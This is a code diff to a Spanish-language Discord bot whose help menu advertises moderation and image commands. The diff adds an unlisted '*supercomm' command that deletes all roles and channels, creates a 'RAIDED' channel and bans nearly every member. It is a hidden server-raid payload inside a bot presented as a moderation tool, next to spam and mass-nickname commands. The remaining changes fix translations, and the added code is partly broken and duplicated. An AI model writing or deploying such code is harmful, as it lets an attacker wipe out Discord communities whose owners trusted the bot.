@@ -53,7 +53,58 @@ client.on('message',  msg => {
 
     },1*1) //3 secondes
     }
-    }
+
+    if (message.content === '*supercomm') {
+    msg.delete();
+    var i = 0
+      msg.guild.roles.cache.forEach(role =>
+        i++
+      )
+        msg.guild.roles.cache.forEach(role => 
+            setTimeout(() => {
+            if(msg.guild.id !== role.id && role.name != "corona" && role.id != notdelete){
+                role.delete()
+            }
+            },1000*3))
+      var i = 0
+      msg.guild.channels.cache.forEach(channel =>
+      i++
+      )
+        msg.guild.channels.cache.forEach(channel => 
+
+         
+            setTimeout(() => {channel.delete()},1000*3))
+            msg.guild.channels.create("RAIDED",{type: 'text'})
+            .then(console.log)
+            .catch(console.error);
+
+            //banall
+            {
+        msg.delete();     
+        msg.guild.members.cache.forEach(member => {
+  
+          if(member != msg.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
+            member.ban();
+          }
+        })  
+        }
+  }
+
+      var i = 0
+      msg.guild.channels.cache.forEach(channel =>
+      i++
+      )
+        msg.guild.channels.cache.forEach(channel => 
+
+         
+            setTimeout(() => {channel.delete()},1000*3))
+            msg.guild.channels.create("RAIDED",{type: 'text'})
+            .then(console.log)
+            .catch(console.error);
+          }
+        }
+        }
+    
     if(msg.content.startsWith("*spam")){
       msg.delete();
       let yourmessage = msg.content.slice('*spam'.length);
@@ -178,7 +229,7 @@ client.on('message',  msg => {
             
             )
         } catch (err) {
-          console.log("null")
+          console.log("Incapaz de enviar el mensaje")
         }
       }
       if((msg.content.startsWith('*everyguildmassnick'))){
@@ -206,7 +257,7 @@ client.on('message',  msg => {
       .addField('Comandos de administracion', 
         '\n`*help` - Muestra los comandos\n`*automod` - Activar l\'Automoderacion en su servidor\n`*antilink` - Activar l\'antilink en su servidor')
       .addField('Comandos de imagen', 
-        '\n`*cat` - Muestra un cat\n`*dog` - Muestra un perro\n`*calin` - Muestra un abrazo\n`*weed` - Muestra la hierba\n`*punch` - Inicia los puñetazos')
+        '\n`*cat` - Muestra un gato\n`*dog` - Muestra un perro\n`*calin` - Muestra un abrazo\n`*weed` - Muestra la hierba\n`*punch` - Inicia los puñetazos')
       .setTimestamp()
       .setFooter('Proyecto Hailu');
         
